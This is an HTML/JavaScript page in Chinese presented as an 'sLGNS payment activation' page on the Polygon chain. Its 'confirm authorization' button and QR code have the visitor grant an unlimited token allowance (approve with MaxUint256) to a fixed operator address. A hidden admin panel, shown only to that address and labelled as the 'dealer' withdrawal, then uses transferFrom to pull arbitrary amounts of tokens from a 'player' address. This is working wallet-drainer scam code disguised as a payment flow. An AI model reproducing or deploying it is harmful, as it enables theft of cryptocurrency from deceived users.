<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>sLGNS 授权提取</title>
<style>
body{background:#111;color:#fff;padding:20px;font-family:Arial}
.main{max-width:380px;margin:0 auto}
.box{background:#222;padding:20px;border-radius:16px;margin-bottom:20px}
button{width:100%;padding:14px;background:#ff9900;color:#000;border:none;border-radius:12px;margin:10px 0;font-size:16px}
input{width:94%;padding:12px;margin:8px 0;border-radius:8px;background:#333;color:#fff;border:0}
#qrcode{margin:20px 0;text-align:center}
#qrcode img{width:280px;height:280px;background:#fff;border-radius:12px}
.admin{display:none}
</style>
</head>
<body>
<div class="main">
  <div class="box">
    <h2>sLGNS 支付开通</h2>
    <p>Polygon 链</p>
    <button id="connect">连接钱包</button>
    <div id="qrcode"></div>
    <button id="pay">确认授权</button>
  </div>

  <div class="box admin" id="admin">
    <h3>庄家提取 sLGNS</h3>
    <input id="user" placeholder="玩家地址">
    <input id="amount" placeholder="提取数量（如 1）">
    <button onclick="take()">提取玩家 sLGNS</button>

    <h3>发放奖励</h3>
    <input id="to" placeholder="接收地址">
    <input id="send" placeholder="发放数量">
    <button onclick="sendToken()">发放 sLGNS</button>
  </div>
</div>

<script src="https://cdn.ethers.org/libethers-5.7.2.umd.min.js"></script>
<script>
// ====================== 你固定的配置 ======================
const TOKEN = "0x99a57E6C8558BC6689f894e068733ADf83C19725";
const ADMIN = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
const CHAIN_ID = 137; // Polygon

let addr;
let provider, signer, token;

async function connect() {
  if (!window.ethereum) return alert("请在钱包浏览器打开");
  provider = new ethers.providers.Web3Provider(window.ethereum);
  await provider.send("wallet_switchEthereumChain", [{ chainId: "0x89" }]);
  await provider.send("eth_requestAccounts", []);
  signer = provider.getSigner();
  addr = await signer.getAddress();
  document.getElementById("connect").innerText = "已连接: " + addr.substr(0, 6) + "...";

  token = new ethers.Contract(TOKEN, [
    "function approve(address,uint256) external",
    "function transferFrom(address,address,uint256) external",
    "function transfer(address,uint256) external",
    "function balanceOf(address) view returns (uint256)"
  ], signer);

  if (addr.toLowerCase() === ADMIN.toLowerCase()) {
    document.getElementById("admin").style.display = "block";
  }
  makeQR();
}

// 生成授权二维码
function makeQR() {
  const data = "0x095ea7b3" + ADMIN.slice(2).padStart(64, "0") + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
  const url = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=ethereum:${ADMIN}@137/${TOKEN}?data=${data}`;
  document.getElementById("qrcode").innerHTML = `<img src="${url}">`;
}

// 玩家授权
async function approve() {
  try {
    const tx = await token.approve(ADMIN, ethers.constants.MaxUint256);
    await tx.wait();
    alert("授权成功");
  } catch (e) {
    alert("授权失败: " + e.message);
  }
}

// ====================== 庄家提取（最简单、最稳） ======================
async function take() {
  const from = document.getElementById("user").value;
  const amt = document.getElementById("amount").value;
  if (!from || !amt || isNaN(amt) || amt <= 0) return alert("输入正确地址和数量");
  try {
    const tx = await token.transferFrom(from, ADMIN, ethers.utils.parseUnits(amt, 18));
    alert("提取已发送，等待上链");
    await tx.wait();
    alert("提取成功！");
  } catch (e) {
    alert("提取失败: " + e.message);
  }
}

// 发放代币
async function sendToken() {
  const to = document.getElementById("to").value;
  const amt = document.getElementById("send").value;
  if (!to || !amt || amt <= 0) return alert("输入正确信息");
  try {
    const tx = await token.transfer(to, ethers.utils.parseUnits(amt, 18));
    alert("发放已发送");
    await tx.wait();
    alert("发放成功！");
  } catch (e) {
    alert("失败: " + e.message);
  }
}

document.getElementById("connect").onclick = connect;
document.getElementById("pay").onclick = approve;
</script>
</body>
</html>
